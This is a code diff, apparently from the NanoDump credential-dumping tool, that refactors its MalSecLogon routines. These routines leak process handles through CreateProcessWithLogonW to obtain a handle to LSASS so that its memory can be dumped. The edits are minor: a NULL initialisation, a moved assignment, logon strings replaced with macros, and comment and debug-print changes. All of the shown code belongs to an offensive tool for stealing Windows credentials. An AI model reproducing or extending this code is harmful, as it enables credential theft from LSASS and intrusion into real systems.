@@ -188,7 +188,7 @@ BOOL MalSecLogon(
     PPROCESS_LIST* Pcreated_processes
 )
 {
-    PPROCESS_LIST created_processes;
+    PPROCESS_LIST created_processes = NULL;
     BOOL success;
 
     DPRINT("Using MalSecLogon to get a handle to " LSASS);
@@ -204,8 +204,8 @@ BOOL MalSecLogon(
             DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
             return FALSE;
         }
-        *Pcreated_processes = created_processes;
     }
+    *Pcreated_processes = created_processes;
     // leak an LSASS handle using MalSecLogon
     success = malseclogon_stage_1(
         binary_path,
@@ -333,9 +333,9 @@ BOOL malseclogon_stage_1(
             startInfo.hStdError = handle_list->Handle[handles_leaked++];
 
         success = CreateProcessWithLogonW(
-            L"NanoDumpUser",
-            L"NanoDumpDomain",
-            L"NanoDumpPwd",
+            NANODUMP_USER,
+            NANODUMP_DOMAIN,
+            NANODUMP_PASSWD,
             LOGON_NETCREDENTIALS_ONLY,
             filename,
             command_line,
@@ -389,7 +389,6 @@ BOOL malseclogon_stage_1(
                 intFree(handle_list); handle_list = NULL;
                 return TRUE;
             }
-            DPRINT("The dump now created");
         }
     }
 
@@ -433,8 +432,9 @@ HANDLE malseclogon_stage_2(
             NtClose((HANDLE)(ULONG_PTR)leakedHandle);
             continue;
         }
-        // found LSASS handle, close all the other ones
+        // found LSASS handle
         hProcess = (HANDLE)(ULONG_PTR)leakedHandle;
+        // close all the other handles
         found_handle = TRUE;
     }
     return hProcess;
